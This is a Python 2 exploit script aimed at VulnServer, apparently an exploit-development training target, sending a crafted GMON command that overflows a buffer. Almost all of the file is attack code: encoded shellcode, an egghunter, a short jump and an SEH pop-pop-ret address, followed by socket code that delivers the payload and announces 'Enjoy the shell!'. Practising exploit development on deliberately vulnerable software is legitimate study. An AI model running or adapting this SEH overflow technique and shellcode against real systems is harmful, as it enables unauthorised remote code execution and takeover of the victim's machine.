#!/usr/env python
import sys
import struct
import socket

#check for server and ip
def main():
	if len(sys.argv) < 3:
		print "\n[!] Usage ./" + sys.argv[0] + " TARGET PORT [!]"
		print "[!] Example ./" + sys.argv[0] + " 10.0.7.4 9999 [!]\n"
	else:
		exploit(sys.argv[1], sys.argv[2])

def exploit(target, port):
	#Target
	rhost = target
	rport = int(port)

	#Exploit
	buffsize = 5010
	header = "GMON /.../" #vulnerable command
	egg = "\x54\x30\x30\x57" * 2
	buf = ""
	buf += "\xdd\xc2\xba\xbf\xc9\x37\x6f\xd9\x74\x24\xf4\x5f\x31"
	buf += "\xc9\xb1\x56\x31\x57\x18\x03\x57\x18\x83\xef\x43\x2b"
	buf += "\xc2\x93\x53\x2e\x2d\x6c\xa3\x4f\xa7\x89\x92\x4f\xd3"
	buf += "\xda\x84\x7f\x97\x8f\x28\x0b\xf5\x3b\xbb\x79\xd2\x4c"
	buf += "\x0c\x37\x04\x62\x8d\x64\x74\xe5\x0d\x77\xa9\xc5\x2c"
	buf += "\xb8\xbc\x04\x69\xa5\x4d\x54\x22\xa1\xe0\x49\x47\xff"
	buf += "\x38\xe1\x1b\x11\x39\x16\xeb\x10\x68\x89\x60\x4b\xaa"
	buf += "\x2b\xa5\xe7\xe3\x33\xaa\xc2\xba\xc8\x18\xb8\x3c\x19"
	buf += "\x51\x41\x92\x64\x5e\xb0\xea\xa1\x58\x2b\x99\xdb\x9b"
	buf += "\xd6\x9a\x1f\xe6\x0c\x2e\x84\x40\xc6\x88\x60\x71\x0b"
	buf += "\x4e\xe2\x7d\xe0\x04\xac\x61\xf7\xc9\xc6\x9d\x7c\xec"
	buf += "\x08\x14\xc6\xcb\x8c\x7d\x9c\x72\x94\xdb\x73\x8a\xc6"
	buf += "\x84\x2c\x2e\x8c\x28\x38\x43\xcf\x24\x8d\x6e\xf0\xb4"
	buf += "\x99\xf9\x83\x86\x06\x52\x0c\xaa\xcf\x7c\xcb\xbb\xd8"
	buf += "\x7e\x03\x03\x88\x80\xa4\x73\x80\x46\xf0\x23\xba\x6f"
	buf += "\x79\xa8\x3a\x8f\xac\x44\x31\x07\x8f\x30\x7d\xb1\x67"
	buf += "\x42\x7e\x2c\x24\xcb\x98\x1e\x84\x9b\x34\xdf\x74\x5b"
	buf += "\xe5\xb7\x9e\x54\xda\xa8\xa0\xbf\x73\x42\x4f\x69\x2b"
	buf += "\xfb\xf6\x30\xa7\x9a\xf7\xef\xcd\x9d\x7c\x05\x31\x53"
	buf += "\x75\x6c\x21\x84\xe2\x8e\xb9\x55\x87\x8e\xd3\x51\x01"
	buf += "\xd9\x4b\x58\x74\x2d\xd4\xa3\x53\x2e\x13\x5b\x22\x06"
	buf += "\x6f\x6a\xb0\x26\x07\x93\x54\xa6\xd7\xc5\x3e\xa6\xbf"
	buf += "\xb1\x1a\xf5\xda\xbd\xb6\x6a\x77\x28\x39\xda\x2b\xfb"
	buf += "\x51\xe0\x12\xcb\xfd\x1b\x71\x4f\xf9\xe3\x07\x78\xa2"
	buf += "\x8b\xf7\x38\x52\x4b\x92\xb8\x02\x23\x69\x96\xad\x83"
	buf += "\x92\x3d\xe6\x8b\x19\xd0\x44\x2a\x1d\xf9\x09\xf2\x1e"
	buf += "\x0e\x92\x05\x64\x7f\x25\xe6\x99\x69\x42\xe7\x99\x95"
	buf += "\x74\xd4\x4f\xac\x02\x1b\x4c\x8b\x1d\x2e\xf1\xba\xb7"
	buf += "\x50\xa5\xbd\x9d"

	egghunter = "\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b"
	egghunter += "\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" #36 bytes egg hunter
	padding = "\xCC" * (3494 - len(egg) - len(egghunter) - len(buf))
	nextseh =  "\xEB\xDC\x90\x90" #jump to back to egg hunter
	seh = "\xb4\x10\x50\x62" #0x625010b4 pop pop ret
	payload = header + egg  + buf + padding + egghunter + nextseh + seh
	
	tail = "D" * (buffsize - len(payload))

	payload += tail

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "\n[*] Attempting to connect to VulnServer at " + rhost + " " + port + " [*]"
	try:
		s.connect((rhost, rport))
		print "[*] Successfully connected to VulnSever! [*]\n"
		print "[*] Sending exploit payload [*]\n"
		s.send(payload)
		print "[*] Exploit sent! Enjoy the shell! [*]\n"
		s.close()
	except socket.error as e:
		print "[!] Failed to connect to host server. Check IP and Port [!]"
		print "[!] Error Description : " + str(e) + "\n"
		

if __name__ == '__main__':
	main()
 

